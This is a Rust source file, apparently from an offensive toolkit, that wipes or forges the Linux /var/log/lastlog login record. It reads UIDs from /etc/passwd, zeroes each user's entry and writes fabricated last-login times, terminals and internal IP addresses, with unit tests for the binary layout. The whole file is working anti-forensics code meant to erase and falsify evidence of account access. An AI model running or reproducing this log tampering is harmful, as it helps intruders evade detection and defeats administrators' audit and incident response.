// Wipe or forge /var/log/lastlog entries.
//
// lastlog is a sparse binary file indexed by UID.
// struct lastlog (glibc x86-64): { ll_time: i64, ll_line: [u8;32], ll_host: [u8;256] }
// Entry size: 8 + 32 + 256 = 296 bytes.
// Entry for UID N is at file offset N * 296.
//
// Sparse file: seeking past end and writing creates a hole — only written UIDs
// consume real disk blocks. Do NOT truncate before writing; the file must remain
// seekable so that UIDs 0..1000+ land at their correct offsets.

use std::fs;
use std::io::{Seek, SeekFrom, Write};
use std::path::Path;

// glibc x86-64 sizeof(struct lastlog) = 8 (i64 ll_time) + 32 (ll_line) + 256 (ll_host)
const LL_ENTRY_SIZE: u64 = 296;

const LASTLOG_PATH: &str = "/var/log/lastlog";

// ── LCG ──────────────────────────────────────────────────────────────────────

struct Lcg(u64);
impl Lcg {
    fn new(seed: i64) -> Self {
        Lcg(seed as u64 ^ 0x13377331_deadbeef)
    }
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0
    }
    fn range(&mut self, lo: u64, hi: u64) -> u64 {
        lo + (self.next() % (hi - lo))
    }
}

// ── Stats ─────────────────────────────────────────────────────────────────────

#[derive(Default)]
pub struct LastlogStats {
    pub entries_wiped: u32,
    pub entries_forged: u32,
    pub errors: u32,
}

// ── Low-level helpers ─────────────────────────────────────────────────────────

fn uid_offset(uid: u32) -> u64 {
    uid as u64 * LL_ENTRY_SIZE
}

fn build_entry(ll_time: i64, line: &str, host: &str) -> [u8; 296] {
    let mut buf = [0u8; 296];
    buf[0..8].copy_from_slice(&ll_time.to_le_bytes());

    let line_bytes = line.as_bytes();
    let llen = line_bytes.len().min(31);
    buf[8..8 + llen].copy_from_slice(&line_bytes[..llen]);
    // null terminator guaranteed by zero-init

    let host_bytes = host.as_bytes();
    let hlen = host_bytes.len().min(255);
    buf[40..40 + hlen].copy_from_slice(&host_bytes[..hlen]);
    buf
}

// ── Wipe: zero out entries for all UIDs with home dirs ───────────────────────

pub fn wipe_lastlog(verbose: bool) -> LastlogStats {
    let mut s = LastlogStats::default();

    let uids = enumerate_uids();
    if uids.is_empty() {
        if verbose {
            eprintln!("[!] lastlog-forge: no UIDs found in /etc/passwd");
        }
        return s;
    }

    let p = Path::new(LASTLOG_PATH);
    if !p.exists() {
        return s;
    }

    let mut f = match fs::OpenOptions::new().write(true).open(p) {
        Ok(f) => f,
        Err(e) => {
            if verbose {
                eprintln!("[!] lastlog: open: {}", e);
            }
            s.errors += 1;
            return s;
        }
    };

    let zero = [0u8; LL_ENTRY_SIZE as usize];
    for uid in &uids {
        let off = uid_offset(*uid);
        // Bounds check against file size to avoid sparse extension
        if let Ok(m) = fs::metadata(p) {
            if off + LL_ENTRY_SIZE > m.len() {
                continue;
            }
        }
        if f.seek(SeekFrom::Start(off)).is_err() {
            s.errors += 1;
            continue;
        }
        match f.write_all(&zero) {
            Ok(_) => {
                s.entries_wiped += 1;
                if verbose {
                    eprintln!("[+] lastlog: zeroed UID {}", uid);
                }
            }
            Err(_) => {
                s.errors += 1;
            }
        }
    }
    s
}

// ── Forge: write plausible last-login entries ─────────────────────────────────

const FAKE_TERMINALS: &[&str] = &["pts/0", "pts/1", "pts/2", "tty1", "tty2"];
const FAKE_HOSTS: &[&str] = &[
    "10.0.0.5",
    "10.0.0.6",
    "192.168.1.12",
    "192.168.100.5",
    "172.16.0.3",
    "10.10.14.2",
    "10.20.0.7",
];

pub fn forge_lastlog(ts_start: i64, ts_end: i64, verbose: bool) -> LastlogStats {
    let mut s = LastlogStats::default();

    let uids = enumerate_uids();
    if uids.is_empty() {
        return s;
    }

    let p = Path::new(LASTLOG_PATH);

    // Open for write (or create); sparse file — seek without truncation.
    // truncate(true) would be wrong here: lastlog must stay seekable.
    #[allow(clippy::suspicious_open_options)]
    let mut f = match fs::OpenOptions::new().write(true).create(true).open(p) {
        Ok(f) => f,
        Err(e) => {
            if verbose {
                eprintln!("[!] lastlog-forge: open: {}", e);
            }
            s.errors += 1;
            return s;
        }
    };

    let mut lcg = Lcg::new(ts_start ^ ts_end);

    for uid in &uids {
        let ts = ts_start + lcg.range(0, (ts_end - ts_start).max(1) as u64) as i64;
        let term = FAKE_TERMINALS[(lcg.next() as usize) % FAKE_TERMINALS.len()];
        let host = FAKE_HOSTS[(lcg.next() as usize) % FAKE_HOSTS.len()];

        let entry = build_entry(ts, term, host);
        let off = uid_offset(*uid);

        if f.seek(SeekFrom::Start(off)).is_err() {
            s.errors += 1;
            continue;
        }
        match f.write_all(&entry) {
            Ok(_) => {
                s.entries_forged += 1;
                if verbose {
                    eprintln!("[+] lastlog-forge: UID {} → ts={} from {}", uid, ts, host);
                }
            }
            Err(e) => {
                s.errors += 1;
                if verbose {
                    eprintln!("[!] lastlog-forge: UID {}: {}", uid, e);
                }
            }
        }
    }
    s
}

// ── Enumerate UIDs from /etc/passwd ──────────────────────────────────────────

fn enumerate_uids() -> Vec<u32> {
    let mut uids = Vec::new();
    if let Ok(content) = fs::read_to_string("/etc/passwd") {
        for line in content.lines() {
            let parts: Vec<&str> = line.splitn(4, ':').collect();
            if parts.len() >= 3 {
                if let Ok(uid) = parts[2].parse::<u32>() {
                    // Include root (0) and normal user UIDs (>= 500 or >= 1000)
                    if uid == 0 || uid >= 500 {
                        uids.push(uid);
                    }
                }
            }
        }
    }
    uids.sort();
    uids.dedup();
    uids
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;

    fn tmpdir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "satan2-test-{}-{}-{}",
            tag,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    /// glibc x86-64 struct lastlog = 8 (ll_time) + 32 (ll_line) + 256 (ll_host).
    #[test]
    fn entry_size_is_296() {
        assert_eq!(LL_ENTRY_SIZE, 296);
        assert_eq!(build_entry(0, "pts/0", "host").len(), 296);
    }

    #[test]
    fn entry_field_layout() {
        let e = build_entry(1_700_000_000, "pts/2", "192.168.1.12");
        assert_eq!(
            i64::from_le_bytes(e[0..8].try_into().unwrap()),
            1_700_000_000,
            "ll_time at offset 0"
        );
        assert_eq!(&e[8..13], b"pts/2", "ll_line at offset 8");
        assert_eq!(e[13], 0, "ll_line must be NUL-terminated");
        assert_eq!(&e[40..52], b"192.168.1.12", "ll_host at offset 40");
        assert_eq!(e[52], 0, "ll_host must be NUL-terminated");
    }

    #[test]
    fn entry_strings_truncated() {
        let e = build_entry(0, &"l".repeat(100), &"h".repeat(500));
        // line capped at 31 chars + NUL; host capped at 255 chars + NUL
        assert_eq!(&e[8..8 + 31], &[b'l'; 31]);
        assert_eq!(e[8 + 31], 0);
        assert_eq!(&e[40..40 + 255], &[b'h'; 255]);
        assert_eq!(e[40 + 255], 0);
    }

    #[test]
    fn uid_offset_math() {
        assert_eq!(uid_offset(0), 0);
        assert_eq!(uid_offset(1), 296);
        assert_eq!(uid_offset(1000), 296_000);
    }

    /// Write entries at sparse UID offsets in a temp file and read them back.
    #[test]
    fn sparse_write_then_read_back() {
        let dir = tmpdir("lastlog");
        let path = dir.join("lastlog");
        let ps = path.to_str().unwrap();

        let e_root = build_entry(1_600_000_000, "tty1", "10.0.0.5");
        let e_user = build_entry(1_650_000_000, "pts/0", "172.16.0.3");

        {
            let mut f = fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .open(ps)
                .unwrap();
            f.seek(SeekFrom::Start(uid_offset(0))).unwrap();
            f.write_all(&e_root).unwrap();
            f.seek(SeekFrom::Start(uid_offset(1000))).unwrap();
            f.write_all(&e_user).unwrap();
        }

        let mut f = fs::File::open(ps).unwrap();
        let mut buf = [0u8; 296];

        f.seek(SeekFrom::Start(uid_offset(0))).unwrap();
        f.read_exact(&mut buf).unwrap();
        assert_eq!(buf, e_root, "root entry corrupted");

        // The hole between entries must read as zeros.
        f.seek(SeekFrom::Start(uid_offset(500))).unwrap();
        f.read_exact(&mut buf).unwrap();
        assert_eq!(buf, [0u8; 296], "sparse hole must read as zeros");

        f.seek(SeekFrom::Start(uid_offset(1000))).unwrap();
        f.read_exact(&mut buf).unwrap();
        assert_eq!(buf, e_user, "uid-1000 entry corrupted");

        std::fs::remove_dir_all(&dir).ok();
    }
}
